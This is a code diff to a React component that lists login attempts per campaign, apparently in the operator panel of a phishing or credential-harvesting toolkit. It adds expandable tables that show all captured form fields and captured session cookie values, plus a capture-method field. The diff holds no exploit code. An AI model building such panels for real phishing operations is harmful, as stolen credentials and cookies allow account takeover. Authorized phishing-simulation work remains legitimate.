@@ -7,6 +7,7 @@ const LoginAttemptsList = ({ campaignId }) => {
   const [loginAttempts, setLoginAttempts] = useState([]);
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState(null);
+  const [expandedIds, setExpandedIds] = useState({});
 
   useEffect(() => {
     if (!campaignId) return;
@@ -42,6 +43,13 @@ const LoginAttemptsList = ({ campaignId }) => {
       console.error('Error downloading cookies:', error);
       alert('Failed to download cookies. Please try again.');
     }
+  };
+
+  const toggleExpand = (id) => {
+    setExpandedIds(prev => ({
+      ...prev,
+      [id]: !prev[id]
+    }));
   };
 
   if (loading && loginAttempts.length === 0) {
@@ -112,6 +120,43 @@ const LoginAttemptsList = ({ campaignId }) => {
                     <div className="text-gray-500 italic">No credentials captured</div>
                   )}
                 </div>
+
+                {/* Form Fields Section */}
+                {attempt.formFields && attempt.formFields.length > 0 && (
+                  <div className="mt-3">
+                    <h4 className="font-semibold text-sm text-gray-700">
+                      All Form Fields 
+                      <button 
+                        onClick={() => toggleExpand(`form-${attempt.id}`)} 
+                        className="ml-2 text-blue-500 text-xs hover:text-blue-700"
+                      >
+                        {expandedIds[`form-${attempt.id}`] ? 'Hide' : 'Show'}
+                      </button>
+                    </h4>
+                    {expandedIds[`form-${attempt.id}`] && (
+                      <div className="bg-white p-3 rounded border mt-1 max-h-60 overflow-y-auto">
+                        <table className="min-w-full divide-y divide-gray-200">
+                          <thead className="bg-gray-50">
+                            <tr>
+                              <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Field Name</th>
+                              <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Value</th>
+                            </tr>
+                          </thead>
+                          <tbody className="divide-y divide-gray-200 text-sm">
+                            {attempt.formFields.map((field, idx) => (
+                              <tr key={`${attempt.id}-field-${idx}`}>
+                                <td className="px-3 py-2 whitespace-nowrap font-medium">{field.name}</td>
+                                <td className="px-3 py-2 whitespace-normal break-all">
+                                  {typeof field.value === 'object' ? JSON.stringify(field.value) : String(field.value)}
+                                </td>
+                              </tr>
+                            ))}
+                          </tbody>
+                        </table>
+                      </div>
+                    )}
+                  </div>
+                )}
               </div>
               
               <div>
@@ -120,15 +165,50 @@ const LoginAttemptsList = ({ campaignId }) => {
                   {attempt.hasCookies ? (
                     <div>
                       <div className="mb-2">{attempt.cookiesCount} cookies captured</div>
-                      <button
-                        onClick={() => handleDownloadCookies(attempt.id)}
-                        className="px-3 py-1 bg-blue-500 text-white rounded hover:bg-blue-600 transition flex items-center space-x-1"
-                      >
-                        <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
-                        </svg>
-                        <span>Download Cookies</span>
-                      </button>
+                      
+                      <div className="flex flex-col space-y-2">
+                        <button
+                          onClick={() => handleDownloadCookies(attempt.id)}
+                          className="px-3 py-1 bg-blue-500 text-white rounded hover:bg-blue-600 transition flex items-center space-x-1"
+                        >
+                          <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+                          </svg>
+                          <span>Download Cookies</span>
+                        </button>
+                        
+                        <button
+                          onClick={() => toggleExpand(`cookies-${attempt.id}`)}
+                          className="px-3 py-1 bg-gray-500 text-white rounded hover:bg-gray-600 transition flex items-center space-x-1"
+                        >
+                          <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                          </svg>
+                          <span>{expandedIds[`cookies-${attempt.id}`] ? 'Hide Cookies' : 'View Cookies'}</span>
+                        </button>
+                      </div>
+                      
+                      {expandedIds[`cookies-${attempt.id}`] && attempt.cookies && attempt.cookies.length > 0 && (
+                        <div className="mt-3 max-h-60 overflow-y-auto">
+                          <table className="min-w-full divide-y divide-gray-200">
+                            <thead className="bg-gray-50">
+                              <tr>
+                                <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Cookie Name</th>
+                                <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Value</th>
+                              </tr>
+                            </thead>
+                            <tbody className="divide-y divide-gray-200 text-sm">
+                              {attempt.cookies.map((cookie, idx) => (
+                                <tr key={`${attempt.id}-cookie-${idx}`}>
+                                  <td className="px-3 py-2 whitespace-nowrap font-medium">{cookie.name}</td>
+                                  <td className="px-3 py-2 whitespace-normal break-all">{cookie.value}</td>
+                                </tr>
+                              ))}
+                            </tbody>
+                          </table>
+                        </div>
+                      )}
                     </div>
                   ) : (
                     <div className="text-gray-500 italic">No cookies captured</div>
@@ -159,6 +239,14 @@ const LoginAttemptsList = ({ campaignId }) => {
                       {attempt.userAgent || 'Not captured'}
                     </td>
                   </tr>
+                  {attempt.captureMethod && (
+                    <tr>
+                      <td className="px-3 py-2 whitespace-nowrap text-sm font-medium text-gray-900">Capture Method</td>
+                      <td className="px-3 py-2 whitespace-normal text-sm text-gray-700">
+                        {attempt.captureMethod}
+                      </td>
+                    </tr>
+                  )}
                 </tbody>
               </table>
             </div>
